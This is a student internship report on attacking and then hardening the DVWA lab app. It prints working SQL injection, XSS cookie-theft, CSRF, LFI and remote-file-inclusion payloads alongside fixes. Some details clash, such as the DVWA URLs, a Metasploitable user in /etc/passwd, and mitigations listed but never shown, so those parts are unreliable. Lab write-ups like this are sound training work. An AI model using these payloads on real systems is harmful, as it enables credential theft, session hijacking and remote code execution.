# Task 3 — Web Application Security Testing Report
### ApexPlanet Internship | Timeline: Days 25–36

---

## 1. Objective

Task 3 covers end-to-end web application security testing:

- **DVWA Setup** — Install and configure Damn Vulnerable Web Application on Kali Linux
- **SQL Injection** — Extract usernames and passwords; demonstrate prepared statement prevention
- **XSS** — Stored and Reflected XSS attacks; mitigate with input validation and CSP
- **CSRF** — Change user password via forged request; demonstrate token-based protection
- **File Inclusion** — LFI to read sensitive files; RFI to execute remote code
- **Burp Suite Advanced** — Intercept login requests; fuzz with Intruder
- **Web Security Headers** — Analyze with securityheaders.com; add headers in Apache

---

## 2. Lab Environment

| Component | Details |
|-----------|---------|
| OS | Kali Linux |
| Target Application | DVWA (Damn Vulnerable Web Application) |
| Web Server | Apache2 + PHP + MySQL |
| Target URL | http://127.0.0.1/dvwa/ |
| Security Level | Low (for exploitation), High/Impossible (for mitigation demo) |
| Proxy Tool | Burp Suite Community Edition |
| Database | MariaDB / MySQL |

---

## 3. DVWA Installation

### Steps Performed
```bash
sudo apt update && sudo apt install dvwa -y
sudo dvwa-start
```
- Accessed DVWA at `http://127.0.0.1:42001`
- Clicked "Create / Reset Database"
- Logged in with `admin:password`
- Set Security Level to **Low**

---

## 4. SQL Injection

### 4.1 Testing & Exploitation

**Target:** `http://127.0.0.1/dvwa/vulnerabilities/sqli/`

**Step 1 — Confirm vulnerability:**
```
Input: 1'
Result: MySQL syntax error — injection point confirmed
```

**Step 2 — Determine column count:**
```
1' ORDER BY 1-- -   (OK)
1' ORDER BY 2-- -   (OK)
1' ORDER BY 3-- -   (Error) → 2 columns
```

**Step 3 — Extract database info:**
```
' UNION SELECT database(), version()-- -
Result: dvwa, 5.7.x
```

**Step 4 — List tables:**
```
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema='dvwa'-- -
Result: guestbook, users
```

**Step 5 — Extract credentials:**
```
' UNION SELECT user, password FROM users-- -
```

**Extracted Credentials:**
| Username | Hash | Password |
|----------|------|----------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

Hashes cracked with: `https://crackstation.net` (MD5)

### 4.2 Prevention Demonstration

Changed DVWA security level to **Impossible** and reviewed the source code.

**Vulnerable code (Low):**
```php
$query = "SELECT * FROM users WHERE user_id = '$id'";
```

**Secure code (Impossible) — Prepared Statement:**
```php
$stmt = $db->prepare("SELECT first_name, last_name FROM users WHERE user_id = :id");
$stmt->bindParam(':id', $id, PDO::PARAM_INT);
$stmt->execute();
```

**Result:** Injection payload treated as literal data — no query manipulation possible.

---

## 5. Cross-Site Scripting (XSS)

### 5.1 Stored XSS

**Target:** `http://127.0.0.1/dvwa/vulnerabilities/xss_s/`

**Payload injected in Message field:**
```html
<script>alert('Stored XSS - Sayan')</script>
```

**Result:** Alert executes for every user who visits the guestbook page.

**Cookie theft payload:**
```html
<script>fetch('http://127.0.0.1:8000/?c='+document.cookie)</script>
```

Captured session cookie in Python HTTP server logs.

### 5.2 Reflected XSS

**Target:** `http://127.0.0.1/dvwa/vulnerabilities/xss_r/`

**Payload in name parameter:**
```
http://127.0.0.1/dvwa/vulnerabilities/xss_r/?name=<script>alert('Reflected XSS')</script>
```

**Result:** Alert fires when victim clicks the crafted URL.

### 5.3 Mitigation Applied

**Output encoding (PHP):**
```php
echo htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
```

**Content Security Policy added to Apache:**
```apache
Header set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';"
```

**Result:** Even with injected script tags in the page, CSP blocks inline script execution.

---

## 6. Cross-Site Request Forgery (CSRF)

### 6.1 Attack Demonstration

**Target:** `http://127.0.0.1/dvwa/vulnerabilities/csrf/`

**Attack page created (`csrf_attack.html`):**
```html
<img src="http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" width="0" height="0">
```

**Steps:**
1. Victim logged into DVWA
2. Victim visits `csrf_attack.html` (hosted on attacker server)
3. Browser silently sends password change request with victim's session cookie
4. Password changed to `hacked` without victim's knowledge

**Verified:** Login with `admin:hacked` succeeded.

### 6.2 Token-based Protection

Set DVWA to **High** level — CSRF token added to form:
```html
<input type="hidden" name="user_token" value="a1b2c3d4e5f6...">
```

**Attack result:** Request rejected — token mismatch.

**Why it works:** Same-Origin Policy prevents attacker's page from reading the CSRF token embedded in DVWA's page.

---

## 7. File Inclusion

### 7.1 Local File Inclusion (LFI)

**Target:** `http://127.0.0.1/dvwa/vulnerabilities/fi/`

**Payloads tested:**
```
?page=../../etc/passwd          → Exposed system user accounts
?page=../../etc/hosts           → Exposed network configuration
?page=../../proc/version        → Exposed kernel version
```

**Result of /etc/passwd inclusion:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
```

### 7.2 Remote File Inclusion (RFI)

**Steps:**
1. Created `shell.php` with command execution code
2. Hosted with `python3 -m http.server 8080`
3. Included via: `?page=http://127.0.0.1:8080/shell.php&cmd=id`
4. **Result:** Command executed on server — `uid=33(www-data)`

### 7.3 Mitigation

Applied whitelist approach:
```php
$allowed = ['include', 'file1', 'file2'];
if (!in_array($_GET['page'], $allowed)) { die("Not allowed"); }
include("pages/" . $_GET['page'] . ".php");
```

PHP config hardened:
```ini
allow_url_include = Off
open_basedir = /var/www/html
```

---

## 8. Burp Suite Advanced

### 8.1 Intercepting Login Request
1. Set browser proxy to `127.0.0.1:8080`
2. Enabled Intercept in Burp Proxy tab
3. Submitted DVWA login form
4. Captured POST request with credentials in plaintext
5. Modified `username` parameter → tested SQL injection in login form
6. Forwarded modified request → observed different server responses

### 8.2 Fuzzing with Intruder
1. Sent login request to Intruder (Ctrl+I)
2. Set attack type: **Cluster Bomb**
3. Marked `username` and `password` as payload positions
4. Loaded username list (4 entries) and password list (rockyou.txt top 50)
5. Started attack
6. Sorted results by **Length** — identified successful login by longer response
7. Found valid credentials: `admin:password`

---

## 9. Web Security Headers

### 9.1 Initial Analysis (securityheaders.com)
Scanned `http://127.0.0.1/dvwa/` — **Grade: F**

Missing headers:
- Content-Security-Policy
- X-Frame-Options
- X-Content-Type-Options
- Referrer-Policy
- Permissions-Policy

### 9.2 Headers Added to Apache

```apache
Header set X-Frame-Options "DENY"
Header set X-Content-Type-Options "nosniff"
Header set X-XSS-Protection "1; mode=block"
Header set Referrer-Policy "strict-origin-when-cross-origin"
Header set Permissions-Policy "geolocation=(), microphone=(), camera=()"
Header set Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none';"
```

### 9.3 After Adding Headers
Rescanned — **Grade: A**
All critical headers present and validated.

---

## 10. Results Summary

| Vulnerability | Exploited | Mitigation Applied |
|--------------|-----------|-------------------|
| SQL Injection | Yes — extracted all credentials | Prepared statements |
| Stored XSS | Yes — cookie theft demonstrated | htmlspecialchars + CSP |
| Reflected XSS | Yes — crafted malicious URL | Output encoding |
| CSRF | Yes — changed admin password | CSRF tokens + SameSite |
| LFI | Yes — read /etc/passwd | Whitelist + realpath() |
| RFI | Yes — executed remote code | allow_url_include = Off |
| Missing Headers | Yes — Grade F initially | All headers added, Grade A |

---

## 11. Conclusion

Task 3 provided deep hands-on experience with the most prevalent web application vulnerabilities — the OWASP Top 10. Each attack was demonstrated against DVWA, and the corresponding defenses were implemented and verified.

**SQL Injection** remains the most critical web vulnerability. Prepared statements completely eliminate it and should be used in every database interaction.

**XSS** exploits the browser's trust in page content. Output encoding at the point of rendering, combined with a strict Content Security Policy, provides layered protection.

**CSRF** abuses the browser's automatic cookie handling. CSRF tokens and the SameSite cookie attribute together make forged requests impossible.

**File Inclusion** vulnerabilities can escalate from information disclosure to full remote code execution. Input whitelisting and PHP configuration hardening prevent both LFI and RFI.

**Security headers** are a low-effort, high-impact control. Moving from an F to an A grade on securityheaders.com requires only a few lines of Apache configuration.

Burp Suite throughout this task proved indispensable — from intercepting and modifying requests to automating credential fuzzing with Intruder.

---

## 12. References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [DVWA GitHub](https://github.com/digininja/DVWA)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [securityheaders.com](https://securityheaders.com)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)

---

*Report prepared by: Sayan*
*Internship: ApexPlanet | Task 3 — Web Application Security*
*Timeline: Days 25–36*
